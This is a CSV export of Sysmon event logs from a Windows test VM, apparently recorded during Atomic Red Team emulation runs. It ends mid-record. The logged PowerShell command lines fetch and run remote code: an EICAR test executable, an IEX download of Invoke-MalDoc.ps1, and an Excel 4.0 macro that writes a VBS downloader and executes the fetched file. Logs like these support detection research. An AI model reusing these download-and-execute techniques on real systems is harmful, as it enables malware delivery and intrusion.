Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19595,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:53.072

ProcessGuid: {f57bd86a-a3f9-658c-d401-000000000f00}

ProcessId: 5012

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a3f9-658c-d401-000000000f00},3588,5012,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:23:53.0732624Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:53.072,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:53.0732624Z""/>
      <EventRecordID>19595</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:53.072</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f9-658c-d401-000000000f00}</Data>
      <Data Name=""ProcessId"">5012</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
&amp; \""""$env:TEMP/PotentiallyUnwanted.exe\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:53.072

ProcessGuid: {f57bd86a-a3f9-658c-d401-000000000f00}

ProcessId: 5012

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
&amp; \""""$env:TEMP/PotentiallyUnwanted.exe\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19594,,,<unknown process>,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:30.853

ProcessGuid: {f57bd86a-a3f5-658c-d201-000000000f00}

ProcessId: 1072

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3f5-658c-d201-000000000f00},3588,1072,,,raw.githubusercontent.com,::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-27T22:23:52.8909243Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:30.853,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:52.8909243Z""/>
      <EventRecordID>19594</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:30.853</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f5-658c-d201-000000000f00}</Data>
      <Data Name=""ProcessId"">1072</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:30.853

ProcessGuid: {f57bd86a-a3f5-658c-d201-000000000f00}

ProcessId: 1072

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:23:49.865,,,,,,,,11,19593,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:23:49.865

ProcessGuid: {f57bd86a-a3f5-658c-d201-000000000f00}

ProcessId: 1072

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_0kwlo5il.ddz.ps1

CreationUtcTime: 2023-12-27 22:23:49.865

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3f5-658c-d201-000000000f00},3588,1072,,,,,,"
      ",-,,,,,,2023-12-27T22:23:49.8738922Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_0kwlo5il.ddz.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:49.865,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:49.8738922Z""/>
      <EventRecordID>19593</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:49.865</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f5-658c-d201-000000000f00}</Data>
      <Data Name=""ProcessId"">1072</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_0kwlo5il.ddz.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:23:49.865</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:23:49.865

ProcessGuid: {f57bd86a-a3f5-658c-d201-000000000f00}

ProcessId: 1072

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_0kwlo5il.ddz.ps1

CreationUtcTime: 2023-12-27 22:23:49.865

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1204.002\src\chromeexec-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ExecChrome\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19592,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:49.763

ProcessGuid: {f57bd86a-a3f5-658c-d201-000000000f00}

ProcessId: 1072

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1204.002\src\chromeexec-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ExecChrome\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a3f5-658c-d201-000000000f00},3588,1072,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:23:49.7647830Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:49.763,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:49.7647830Z""/>
      <EventRecordID>19592</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:49.763</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f5-658c-d201-000000000f00}</Data>
      <Data Name=""ProcessId"">1072</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1204.002\src\chromeexec-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ExecChrome\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:49.763

ProcessGuid: {f57bd86a-a3f5-658c-d201-000000000f00}

ProcessId: 1072

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1204.002\src\chromeexec-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ExecChrome\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19591,,,<unknown process>,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:27.077

ProcessGuid: {f57bd86a-a3f1-658c-ce01-000000000f00}

ProcessId: 10524

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3f1-658c-ce01-000000000f00},3588,10524,,,raw.githubusercontent.com,::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-27T22:23:48.9218048Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:27.077,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:48.9218048Z""/>
      <EventRecordID>19591</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:27.077</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f1-658c-ce01-000000000f00}</Data>
      <Data Name=""ProcessId"">10524</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:27.077

ProcessGuid: {f57bd86a-a3f1-658c-ce01-000000000f00}

ProcessId: 10524

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:23:48.201,,,,,,,,11,19590,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:23:48.201

ProcessGuid: {f57bd86a-a3f4-658c-d001-000000000f00}

ProcessId: 5512

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_votnz1ks.qef.ps1

CreationUtcTime: 2023-12-27 22:23:48.201

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3f4-658c-d001-000000000f00},3588,5512,,,,,,"
      ",-,,,,,,2023-12-27T22:23:48.2072632Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_votnz1ks.qef.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:48.201,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:48.2072632Z""/>
      <EventRecordID>19590</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:48.201</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f4-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">5512</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_votnz1ks.qef.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:23:48.201</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:23:48.201

ProcessGuid: {f57bd86a-a3f4-658c-d001-000000000f00}

ProcessId: 5512

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_votnz1ks.qef.ps1

CreationUtcTime: 2023-12-27 22:23:48.201

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$fname = \""""$env:TEMP\atomic_redteam_x4m_exec.vbs\""""
$fname1 = \""""$env:TEMP\procexp.exe\""""
if (Test-Path $fname) {
  Remove-Item $fname
  Remove-Item $fname1
}

$xlApp = New-Object -COMObject \""""Excel.Application\""""
$xlApp.Visible = $True
$xlApp.DisplayAlerts = $False
$xlBook = $xlApp.Workbooks.Add()
$sheet = $xlBook.Excel4MacroSheets.Add()

if (\""""$env:Username\"""" -ne \""""\"""") {
  $sheet.Cells.Item(1,1) = \""""$env:Username\""""
} else {
  $sheet.Cells.Item(1,1) = \""""=GET.WORKSPACE(26)\""""
}

$sheet.Cells.Item(2,1) = \""""procexp.exe\""""
$sheet.Cells.Item(3,1) = \""""atomic_redteam_x4m_exec.vbs\""""
$sheet.Cells.Item(4,1) = \""""=IF(ISNUMBER(SEARCH(`\""""64`\"""",GET.WORKSPACE(1))), GOTO(A5),)\""""
$sheet.Cells.Item(5,1) = \""""=FOPEN(`\""""C:\Users\`\""""&A1&`\""""\AppData\Local\Temp\`\""""&A3&`\""""`\"""", 3)\""""
$sheet.Cells.Item(6,1) = \""""=FWRITELN(A5, `\""""url = `\""""`\""""https://live.sysinternals.com/procexp.exe`\""""`\""""`\"""")\""""
$sheet.Cells.Item(7,1) = \""""=FWRITELN(A5, `\""""`\"""")\""""
$sheet.Cells.Item(8,1) = \""""=FWRITELN(A5, `\""""Set winHttp = CreateObject(`\""""`\""""WinHTTP.WinHTTPrequest.5.1`\""""`\"""")`\"""")\""""
$sheet.Cells.Item(9,1) = \""""=FWRITELN(A5, `\""""winHttp.Open `\""""`\""""GET`\""""`\"""", url, False`\"""")\""""
$sheet.Cells.Item(10,1) = \""""=FWRITELN(A5, `\""""winHttp.Send`\"""")\""""
$sheet.Cells.Item(11,1) = \""""=FWRITELN(A5, `\""""If winHttp.Status = 200 Then`\"""")\""""
$sheet.Cells.Item(12,1) = \""""=FWRITELN(A5, `\""""Set oStream = CreateObject(`\""""`\""""ADODB.Stream`\""""`\"""")`\"""")\""""
$sheet.Cells.Item(13,1) = \""""=FWRITELN(A5, `\""""oStream.Open`\"""")\""""
$sheet.Cells.Item(14,1) = \""""=FWRITELN(A5, `\""""oStream.Type = 1`\"""")\""""
$sheet.Cells.Item(15,1) = \""""=FWRITELN(A5, `\""""oStream.Write winHttp.responseBody`\"""")\""""
$sheet.Cells.Item(16,1) = \""""=FWRITELN(A5, `\""""oStream.SaveToFile `\""""`\""""C:\Users\`\""""&A1&`\""""\AppData\Local\Temp\`\""""&A2&`\""""`\""""`\"""", 2`\"""")\""""
$sheet.Cells.Item(17,1) = \""""=FWRITELN(A5, `\""""oStream.Close`\"""")\""""
$sheet.Cells.Item(18,1) = \""""=FWRITELN(A5, `\""""End If`\"""")\""""
$sheet.Cells.Item(19,1) = \""""=FCLOSE(A5)\""""
$sheet.Cells.Item(20,1) = \""""=EXEC(`\""""explorer.exe C:\Users\`\""""&A1&`\""""\AppData\Local\Temp\`\""""&A3&`\""""`\"""")\""""
$sheet.Cells.Item(21,1) = \""""=WAIT(NOW()+`\""""00:00:05`\"""")\""""
$sheet.Cells.Item(22,1) = \""""=EXEC(`\""""explorer.exe C:\Users\`\""""&A1&`\""""\AppData\Local\Temp\`\""""&A2&`\""""`\"""")\""""
$sheet.Cells.Item(23,1) = \""""=HALT()\""""
$sheet.Cells.Item(1,1).Name = \""""runme\""""
$xlApp.Run(\""""runme\"""")
$xlApp.Quit()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Remove-Variable xlBook
Remove-Variable xlApp}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19589,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:48.094

ProcessGuid: {f57bd86a-a3f4-658c-d001-000000000f00}

